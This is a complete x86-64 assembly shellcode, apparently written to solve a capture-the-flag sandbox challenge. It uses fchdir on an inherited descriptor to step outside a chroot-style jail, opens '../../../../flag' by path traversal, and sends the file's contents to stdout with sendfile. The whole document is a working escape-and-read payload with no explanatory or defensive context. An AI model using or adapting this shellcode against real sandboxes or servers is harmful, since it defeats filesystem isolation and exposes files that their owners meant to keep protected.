.global _start

_start: 
 # fchdir syscall
 mov $81, %rax
 mov $3, %rdi
 syscall

 # open file
 mov $2, %rax
 lea flag(%rip), %rdi
 xor %rsi, %rsi
 xor %rdx, %rdx
 syscall

 # sendfile to stdout (fd=1)
 mov $1, %rdi
 mov %rax, %rsi
 xor %rdx, %rdx
 mov $0x1000, %r10
 mov $40, %al
 syscall

 # exit
 mov $60, %al
 xor %rdi, %rdi
 syscall
flag:
  .string "../../../../flag"
